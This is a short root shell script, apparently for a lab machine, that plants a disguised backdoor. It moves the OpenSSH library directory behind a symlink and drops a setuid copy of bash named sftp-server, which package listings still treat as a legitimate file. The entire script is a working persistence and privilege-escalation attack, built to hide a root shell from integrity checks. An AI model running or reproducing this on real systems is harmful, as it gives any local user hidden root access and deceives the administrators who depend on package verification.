#!/bin/sh
# Moves a package's directory away, leaves a link in its place and puts a
# setuid copy of bash behind the link under a name the package lists.
# dpkg's file list still names /usr/lib/openssh/sftp-server; what is there
# now is the shell.
# Runs as root inside a lab machine.
set -eu
mv /usr/lib/openssh /usr/share/misc-data
ln -s /usr/share/misc-data /usr/lib/openssh
cp /bin/bash /usr/share/misc-data/sftp-server
chmod 4755 /usr/share/misc-data/sftp-server
